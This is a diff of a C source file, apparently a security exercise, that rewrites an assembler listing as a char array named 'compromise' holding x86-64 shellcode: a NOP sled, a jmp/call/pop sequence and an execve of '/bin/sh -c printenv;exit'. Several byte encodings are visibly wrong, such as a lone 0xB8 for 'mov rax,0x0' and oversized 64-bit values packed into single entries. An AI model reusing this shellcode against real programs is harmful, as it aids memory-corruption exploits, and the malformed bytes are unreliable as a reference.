@@ -15,64 +15,62 @@ int main(int argc, char * argv[]){
     exit(0);
 }
 
-// VAriable to contain hex bytes of shell code
+// Variable to contain hex bytes of shell code
 char compromise[160] = {
-                                      //bits 64
-     2                                //            ; two nop matching size in selfcomp.c
-     3 00000000 90                    //              nop
-     4 00000001 90                    //              nop
-     5                                //              ; find out where we are
-     6 00000002 EB62                  //  start:     jmp short codeEnd
-     7 00000004 5E                    //  start2:    pop rsi
-     8                                //              ; clear the a register
-     9 00000005 B800000000            //             mov rax,0x0
-    10                                //              ; restore null bytes to data
-    11 0000000A 884607                //             mov [byte rsi+flagStr-exeStr-2],al
-    12 0000000D 88460B                //            mov [byte rsi+cmdStr-exeStr-1],al
-    13 00000010 884619                //             mov [byte rsi+arrayAddr-exeStr-1],al
-    14 00000013 48894632              //             mov [byte rsi+arrayAddr-exeStr+24],rax
-    15                                //             
-    16                                //              ; restore argv
-    17                                //              
-    18 00000017 4889761A              //             mov [byte rsi + arrayAddr - exeStr],rsi
-    19 0000001B 488D7E09              //             lea rdi,[byte rsi + flagStr - exeStr] 
-    20 0000001F 48897E1E              //             mov [byte rsi + arrayAddr - exeStr + 4],rdi
-    21 00000023 488D7E0C              //             lea rdi, [byte rsi + cmdStr - exeStr]
-    22 00000027 48897E22              //             mov [byte rsi + arrayAddr - exeStr + 8],rdi
-    23                                //  
-    24                                //             ; execve system call
-    25 0000002B B03B                  //             mov al,0x3b
-    26 0000002D 48BF-                 //             mov rdi,exeStr
-    26 0000002F [6B00000000000000]    
-    27 00000037 48BE-                 //             mov rsi,arrayAddr
-    27 00000039 [8500000000000000] 
-    28 00000041 4889E2                //             mov rdx,rsp
-    29 00000044 48C1EA20              //             shr rdx,32
-    30 00000048 48C1E220              //             shl rdx,32
-    31 0000004C 488B0C25C056FBF7      //             mov rcx,[0x7ffff7fb56c0]
-    31          ******************    //   warning: dword data exceeds bounds [-w+number-overflow]
-    31          ******************    //   warning: dword data exceeds bounds [-w+number-overflow]
-    32 00000054 4809CA                //             or  rdx,rcx
-    33 00000057 488D3A                //             lea rdi,[rdx]
-    34 0000005A 0F05                  //             syscall
-    35                                //  
-    36                                //              ; exit system call
-    37 0000005C 4889C7                //             mov rdi,rax
-    38 0000005F 4831C0                //             xor rax,rax
-    39 00000062 B03C                  //             mov al,0x3c
-    40 00000064 0F05                  //             syscall
-    41                                //  
-    42 00000066 E899FFFFFF            //  codeEnd:   call start2
-    43                                //              ; data
-    44 0000006B 2F62696E2F73685879    //  exeStr:    db "/bin/shXy"
-    45 00000074 2D6358                //  flagStr:   db "-cX"
-    46 00000077 7072696E74656E763B-   //  cmdStr:    db "printenv;exitX"
-    46 00000080 6578697458         
-    47 00000085 FFFFFFFF              //  arrayAddr: dd 0xffffffffffffffff
-    48 00000089 FFFFFFFF              //             dd 0xffffffffffffffff
-    49 0000008D FFFFFFFF              //             dd 0xffffffffffffffff
-    50 00000091 FFFFFFFF              //             dd 0xffffffffffffffff
-    51 00000095 93000000              //  newAddr: dd newAddr-start
+                                             //  bits 64
+     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,//; two nop matching size in selfcomp.c
+     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+     0x90,0x90,0x90,0x90,
+     0x90,0x90,                              // ; top two bytes
+     0x90,     
+     0xEB,0x62,                              //  start:     jmp short codeEnd
+     0x5E,                                   //  start2:    pop rsi
+                                             //   ; clear the a register
+     0xB8,                                   //             mov rax,0x0
+                                             //   ; restore null bytes to data
+     0x88,0x46,0x07,                         //             mov [byte rsi+flagStr-exeStr-2],al
+     0x88,0x46,0x0B,                         //             mov [byte rsi+cmdStr-exeStr-1],al
+     0x88,0x46,0x19,                         //             mov [byte rsi+arrayAddr-exeStr-1],al
+     0x48,0x89,0x46,0x32,                    //             mov [byte rsi+arrayAddr-exeStr+24],rax
+                                             //    ; restore argv
+     0x48,0x89,0x76,0x1A,                    //             mov [byte rsi + arrayAddr - exeStr],rsi
+     0x48,0x8D,0x7E,0x09,                    //             lea rdi,[byte rsi + flagStr - exeStr] 
+     0x48,0x89,0x7E,0x1E,                    //             mov [byte rsi + arrayAddr - exeStr + 4],rdi
+     0x48,0x8D,0x7E,0x0C,                    //             lea rdi, [byte rsi + cmdStr - exeStr]
+     0x48,0x89,0x7E,0x22,                    //             mov [byte rsi + arrayAddr - exeStr + 8],rdi
+                                             //     ; execve system call
+     0xB0,0x3B,                              //             mov al,0x3b
+     0x48,0xBF,0x6B00000000000000,           //             mov rdi,exeStr
+     
+     0x48,0xBE,0x8500000000000000,           //             mov rsi,arrayAddr
+     0x48,0x89,0xE2,                         //             mov rdx,rsp
+     0x48,0xC1,0xEA,0x20,                    //             shr rdx,32
+     0x48,0xC1,0xE2,0x20,                    //             shl rdx,32
+     0x48,0x8B,0x0C,0x25,0xC0,0x56,0xFB,0xF7,//             mov rcx,[0x7ffff7fb56c0]
+     0x48,0x09,0xCA,                         //             or  rdx,rcx
+     0x48,0x8D,0x3A,                         //             lea rdi,[rdx]
+     0x0F,0x05,                              //             syscall  
+                                             //     ; exit system call
+     0x48,0x89,0xC7,                         //             mov rdi,rax
+     0x48,0x31,0xC0,                         //             xor rax,rax
+     0xB0,0x3C,                              //             mov al,0x3c
+     0x0F,0x05,                              //             syscall
+                           
+     0xE8,0x99,0xFF,0xFF,0xFF,               //  codeEnd:   call start2
+                                             //    ; data
+     0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,     //  exeStr:    db "/bin/shXy"
+     0x58,0x79,
+     0x2D,0x63,0x58,                         //  flagStr:   db "-cX"
+     0x70,0x72,0x69,0x6E,0x74,0x65,0x6E,0x76,0x3B,   //  cmdStr:    db "printenv;exitX"
+     0x65,0x78,0x69,0x74,0x58,         
+     0xFF,0xFF,0xFF,0xFF,                    //  arrayAddr: dd 0xffffffffffffffff
+     0xFF,0xFF,0xFF,0xFF,                    //             dd 0xffffffffffffffff
+     0xFF,0xFF,0xFF,0xFF,                    //             dd 0xffffffffffffffff
+     0xFF,0xFF,0xFF,0xFF,                    //             dd 0xffffffffffffffff
+     0x93,0x00,0x00,0x00                     //  newAddr: dd newAddr-start
 
 };
 
